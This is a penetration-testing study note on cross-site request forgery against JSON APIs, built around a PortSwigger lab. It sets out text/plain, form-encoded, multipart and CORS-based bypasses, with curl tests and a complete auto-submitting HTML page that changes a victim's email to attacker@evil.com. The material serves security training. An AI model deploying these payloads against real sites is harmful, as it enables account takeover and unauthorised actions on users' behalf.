---
tags: [vapt, csrf, intermediate]
difficulty: intermediate
module: "11 - CSRF"
topic: "11.08 CSRF via JSON (Content-Type Tricks)"
portswigger_labs: ["CSRF where content type is application/json"]
---

# 11.08 — CSRF via JSON (Content-Type Tricks)

## The Problem with JSON CSRF

```
NORMAL FORM-BASED CSRF:
  <form method="POST">
  Content-Type: application/x-www-form-urlencoded → SIMPLE REQUEST → no preflight
  
JSON API CSRF:
  fetch('/api/action', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({action: 'delete'})
  });
  Content-Type: application/json → COMPLEX REQUEST → triggers preflight OPTIONS
  
  Browser: OPTIONS /api/action HTTP/1.1
  Server: "Not from evil.com! Rejected!"
  
  So JSON APIs seem protected... but there are bypasses!
```

---

## Bypass 1 — Use text/plain Instead of application/json

```
SCENARIO: Server accepts JSON but doesn't strictly check Content-Type!

ATTACK:
  <form action="https://target.com/api/update" method="POST" enctype="text/plain">
    <input type="hidden" name='{"action":"delete_account","confirm":true}' value="">
  </form>
  
  This sends:
  POST /api/update HTTP/1.1
  Content-Type: text/plain
  
  {"action":"delete_account","confirm":true}=
  
  If the server parses this as JSON (ignoring Content-Type) → CSRF!
  
NOTE: The "=" at the end makes this invalid JSON, but some parsers are lenient.

CLEANER text/plain PAYLOAD:
  Input name: {"action":"delete","x":"
  Input value: "}
  
  Result body: {"action":"delete","x":"="}
              ← Valid JSON! No stray = signs!
```

---

## Bypass 2 — Server Ignores Content-Type

```
TEST: Does the server actually require Content-Type: application/json?

CURL TEST:
  # Normal request:
  curl -X POST https://target.com/api/change-email \
    -H "Content-Type: application/json" \
    -H "Cookie: session=YOURS" \
    -d '{"email": "attacker@evil.com"}'
  
  # Test with form encoding:
  curl -X POST https://target.com/api/change-email \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: session=YOURS" \
    -d 'email=attacker@evil.com'
  
  If both work → form-based CSRF is possible!

IN BURP:
  1. Intercept POST request with JSON body
  2. Change Content-Type to: application/x-www-form-urlencoded
  3. Change body from JSON to: email=attacker%40evil.com
  4. If server responds 200 → vulnerable to form-based CSRF!
```

---

## Bypass 3 — CORS Misconfiguration Enables JSON CSRF

```
IF: CORS reflects origin + allows credentials
THEN: You can make credentialed JSON requests from evil.com!

ATTACK:
  <script>
  fetch('https://target.com/api/delete-account', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({confirm: true})
  });
  </script>
  
  WITH CORS MISCONFIG:
  Browser sends OPTIONS preflight to target.com
  target.com responds: "Access-Control-Allow-Origin: https://evil.com"
  Browser proceeds: sends actual POST request
  Victim's cookies included → action executes!
  
  THIS IS A CORS ATTACK THAT ENABLES JSON CSRF!
```

---

## Bypass 4 — Multipart Form Data with JSON-like Content

```
SOME SERVERS parse multipart body as JSON!

ATTACK:
  <form action="https://target.com/api/update" 
        method="POST" 
        enctype="multipart/form-data">
    <input type="hidden" name="data" 
           value='{"action": "make_admin", "user": "attacker"}'>
  </form>
  
  Server receives:
  Content-Type: multipart/form-data; boundary=----boundary
  
  ------boundary
  Content-Disposition: form-data; name="data"
  
  {"action": "make_admin", "user": "attacker"}
  ------boundary--
  
  If server extracts "data" field and parses it as JSON → CSRF!
```

---

## Detecting JSON CSRF Vulnerability

```bash
# STEP 1: IDENTIFY JSON ENDPOINTS:
# Look for: Content-Type: application/json in requests
# Look for: Accept: application/json in requests

# STEP 2: TEST CONTENT-TYPE FLEXIBILITY:
# In Burp Repeater, modify Content-Type and body format:

# Test 1: Remove Content-Type header entirely
# Test 2: Change to text/plain
# Test 3: Change to application/x-www-form-urlencoded + change body format
# Test 4: Change to multipart/form-data

# STEP 3: IF ANY RETURNS SUCCESS → BUILD CSRF PoC

# STEP 4: CHECK CORS HEADERS:
curl -H "Origin: https://evil.com" https://target.com/api/sensitive \
  -H "Cookie: session=YOURS"
# Look for ACAO: https://evil.com + ACAC: true

# STEP 5: LOOK FOR OTHER MISCONFIGS:
# - Token in URL params (JSON can also have CSRF tokens)
# - Token not checked (same bypass techniques from note 05)
```

---

## JSON CSRF PoC Using text/plain Trick

```html
<!-- COMPLETE ATTACK PAGE FOR text/plain JSON CSRF: -->
<html>
<head><title>JSON CSRF PoC</title></head>
<body>
  <form id="csrf" action="https://target.com/api/change-email" 
        method="POST" 
        enctype="text/plain">
    <!-- 
      TECHNIQUE: Name becomes the key, value becomes the value
      Browser sends: {"email":"attacker@evil.com","x":"="}
      The trailing "=" is harmless if server ignores it
    -->
    <input type="hidden" name='{"email":"attacker@evil.com","x":"' value='"}'>
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>

<!-- WHAT GETS SENT:
     POST /api/change-email HTTP/1.1
     Content-Type: text/plain
     
     {"email":"attacker@evil.com","x":"="}
     
     If server parses body as JSON and ignores Content-Type → SUCCESS!
-->
```

---

## Related Notes
- [[04 - CSRF via POST Request]] — standard POST CSRF
- [[05 - CSRF Token Bypass Techniques]] — token bypass
- [[07 - CSRF via CORS Misconfiguration]] — reading tokens or bypassing via CORS
- [[09 - CSRF to Account Takeover]] — full exploitation chain
- [[Module 12 - CORS]] — full CORS attack techniques
